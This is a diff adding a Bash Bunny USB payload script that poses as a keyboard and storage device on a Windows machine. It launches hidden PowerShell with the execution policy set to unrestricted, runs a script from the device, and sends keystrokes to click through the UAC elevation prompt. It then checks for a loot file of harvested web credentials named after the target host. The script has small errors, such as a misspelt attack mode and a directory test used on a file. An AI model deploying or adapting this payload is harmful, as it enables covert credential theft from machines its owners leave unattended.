@@ -1,0 +1,37 @@
+#AUTHOR: Faisal
+
+LED SETUP
+ATTACKMODE STROAGE HID
+
+LED ATTACK
+
+DUCKY_LANG us
+RUN WIN powershell -windowstyle hidden "\$u=gwmi Win32_Volume|?{\$_.Label -eq'BASHBUNNY'}|select name;cd \$u.name;Set-executionpolicy unrestricted -force;./m.ps1"
+Q CTRL-SHIFT ENTER
+Q DELAY 3700
+Q ALT y
+Q DELAY 7000
+sync
+#Checks if there is web-creds.txt
+
+LED W
+#White to check if the file is there or not
+
+GET TARGET_HOSTNAME
+HOST=${TARGET_HOSTNAME}
+FILE=/root/udisk/loot/$HOST/web-creds.txt
+
+#Condition to check if file is present
+
+if [ -d "$FILE" ]; then
+	LED FINISH
+else
+	LED C FAST
+	Q DELAY 5000
+	if [ -d "$FILE" ]; then
+		sync
+		LED FINISH
+	else
+		LED FAIL
+	fi
+fi
